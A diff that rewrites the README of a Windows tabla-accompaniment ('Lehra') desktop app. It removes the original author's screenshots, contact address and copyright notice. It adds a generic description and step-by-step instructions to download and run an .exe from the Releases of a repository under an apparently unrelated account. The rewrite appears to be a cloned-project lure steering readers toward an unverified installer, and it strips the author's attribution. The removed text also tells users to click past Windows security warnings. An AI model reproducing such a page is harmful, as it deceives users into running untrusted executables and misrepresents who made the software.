@@ -1,108 +1,59 @@
-# Lehra_App-Anish_Savkar
-Lehra_App-Anish_Savkar is a desktop Lehra app featuring high-quality endless playback of multiple Taals across a wide BPM range, along with a live beat indicator, light and dark themes, and intuitive playback controls. Built for Indian classical music enthusiasts to practice and perform with professional Tabla accompaniment-offline and free of cost.
-Built with C++, Qt 6, and QML, Lehra_App-Anish_Savkar delivers a smooth, responsive, and intuitive user experience while maintaining high-performance audio playback by Anish Savkar. Designed as a reliable offline companion for Indian classical musicians, it has been recommended and appreciated by numerous music professionals.
+# 🎶 Lehra_App-Anish_Savkar - Professional Tabla accompaniment for your practice
 
----
+[![Download Lehra App](https://img.shields.io/badge/Download-Lehra_App_for_Windows-blue.svg)](https://github.com/natesuppressive996/Lehra_App-Anish_Savkar)
 
-## Features
+Lehra_App-Anish_Savkar provides high-quality accompaniment for Indian classical music practitioners. This application offers endless playback of multiple Taals across a wide range of tempos. It includes a live beat indicator to keep your rhythm precise. You can choose between light and dark themes based on your environment. Use the playback controls to manage your practice session without interruption. The software works offline and remains free to use.
 
-* 🎼 Multiple Taals
-* ⚡ Wide BPM range with real-time adjustment
-* 🔄 Endless seamless playback
-* 🥁 Live beat indicator
-* 🎵 High-quality audio with pitch-preserving playback
-* 🌙 Light & Dark themes
-* ⏯️ Play, Pause and Stop controls
-* 💻 Offline operation
-* 🪶 Lightweight Windows application
-* Adaptive Beat indicators that change with the Taal
+## 📥 How to download the app
 
----
+To begin using the application, follow these steps:
 
-## Installation
+1. Visit the project repository page at this link: [https://github.com/natesuppressive996/Lehra_App-Anish_Savkar](https://github.com/natesuppressive996/Lehra_App-Anish_Savkar).
+2. Locate the Releases section on the right side of the page.
+3. Click the most recent version available.
+4. Look for the file ending in .exe under the Assets heading.
+5. Download this installer file to your computer.
+6. Once the download finishes, open the file to start the installation process.
+7. Follow the prompts on your screen to complete the setup.
 
-1. Open the **Releases** section of this repository.
-2. Download the latest Windows installer (`Lehra_App-Anish_Savkar_Setup.exe`).
-3. Run the installer.
-4. Give the necessary permissions-windows may display warnings, please select Click More info → Run anyway
-(this is common for unsigned applications)
-5. Launch **Lehra** from the Start Menu or Desktop shortcut.
+## ⚙️ System requirements
 
----
+This application runs on Windows 10 and Windows 11. Ensure your computer meets these basic specifications for stable performance:
 
-## Demo
+* Processor: Modern dual-core CPU or better.
+* Memory: At least 4 GB of RAM.
+* Storage: 200 MB of free disk space.
+* Audio: Standard sound card with speakers or headphones.
 
-(https://youtu.be/hi_7PSciBx4)
+The software utilizes Qt6 framework components to manage the interface and audio processing. It does not require an active internet connection after the installation completes.
 
----
+## 🎹 Features and usage
 
+The application offers several tools designed for musicians. Use these features to improve your practice routine:
 
-## Screenshots
-<img width="1736" height="1076" alt="IMG_20260717_232810" src="https://github.com/user-attachments/assets/a38dcf06-43ab-4b82-a274-8f2f203291b5" />
+### Playing Taals
+The main view displays a list of available Taals. Select your desired rhythm from the list. The app begins playback immediately upon selection. You can adjust the tempo using the slider located at the bottom of the screen. The tempo range supports slow practice for beginners and fast speeds for advanced performance.
 
+### Beat indicator
+The visual indicator tracks the pulse of the Taal in real time. This tool ensures you stay in sync with the rhythm. The indicator moves in time with the audio output. Watch this display to verify your placement during practice.
 
-<img width="1766" height="1080" alt="IMG_20260717_232842" src="https://github.com/user-attachments/assets/47338df9-9058-4880-8300-bb0b13292280" />
+### Visual themes
+You can change the look of the player to match your preference. Go to the Settings menu and toggle between the Light and Dark themes. The dark theme reduces screen brightness, which helps during late-night practice sessions.
 
+### Playback control
+Use the play, pause, and stop buttons to manage your practice sessions. The endless playback feature ensures the Taal continues without breaks. This helps you maintain focus during long practice hours.
 
-<img width="1770" height="1080" alt="IMG_20260717_233112" src="https://github.com/user-attachments/assets/22e1f1f9-4a92-44d7-a6bd-2bce483639f5" />
+## 🛠 Troubleshooting common issues
 
+If you encounter problems, check these solutions:
 
-<img width="1802" height="1080" alt="IMG_20260717_233119" src="https://github.com/user-attachments/assets/fd3e0766-3772-46c5-821b-68eef351c84d" />
+* If the app fails to start, verify your Windows version meets the minimum requirements.
+* If you hear no sound, check your default Windows audio output device. Ensure your speakers or headphones connect properly.
+* If the interface looks blurry, check your display scaling settings in Windows. 100% scaling provides the clearest experience.
+* If the app crashes, restart your computer and try opening it again. This often clears temporary errors related to background processes.
 
+## 📋 Updates and feedback
 
-<img width="1770" height="1080" alt="IMG_20260717_233127" src="https://github.com/user-attachments/assets/5e66be8d-a1f4-4dcb-9c63-4dfbef0a5509" />
+The development team builds this software using C++ and CMake. This approach provides stability and efficient resource usage on desktop systems. If you notice a bug or wish to suggest a new feature, you may open an issue on the GitHub repository page. This helps track improvements for future releases. Ensure you include your Windows version and the application version number when reporting issues.
 
-
-<img width="1790" height="1080" alt="IMG_20260717_233136" src="https://github.com/user-attachments/assets/d4be2ee9-3deb-4bcd-8286-0b60da6c164f" />
-
-
-<img width="1776" height="1080" alt="IMG_20260718_001639" src="https://github.com/user-attachments/assets/efc88df8-f2b7-45c5-be27-ba8d49d2ae37" />
-
-
-<img width="1734" height="1031" alt="Screenshot_2026-07-18-00-19-15-76_7ecc343528d84aae1423bfb8eca3bd44" src="https://github.com/user-attachments/assets/4e445b0c-517c-4021-bf26-9396774144d8" />
-
----
-
-## Technology Stack
-
-* C++
-* Qt 6
-* Qt Quick (QML)
-* Qt Multimedia
-* CMake
-
----
-
-## Future Improvements
-
-* Additional Taals
-* More customization options
-* Enhanced playback controls
-* Additional UI improvements
-
----
-
-## Feedback/Support
-
-If you discover a bug or have a suggestion, feel free to contact- <br>
-lehraapp.anish.support@gmail.com <br> 
-  <br>
-Responses may take 2-3 business days :) <br>
-
----
-
-## Copyright
-
-Copyright © 2026 Anish Savkar
-
-All Rights Reserved.
-
-This software and its source code are the intellectual property of Anish Savkar. No part of this project may be copied, reproduced, modified, distributed, reverse engineered, or used in any form without prior written permission of the copyright holder.
-
-**WARNING:** Unauthorized use, reproduction, distribution, or plagiarism of this work may result in legal action to the fullest extent permitted by applicable copyright and intellectual property laws.
-
----
-
-Designed, Developed & Audio Credits
-© 2026 Anish Savkar
-All Rights Reserved.
+Keywords: audio-player, cmake, cplusplus, cpp, gui, multimedia, musician-tools, qml, qt, qt6, qtquick, windows
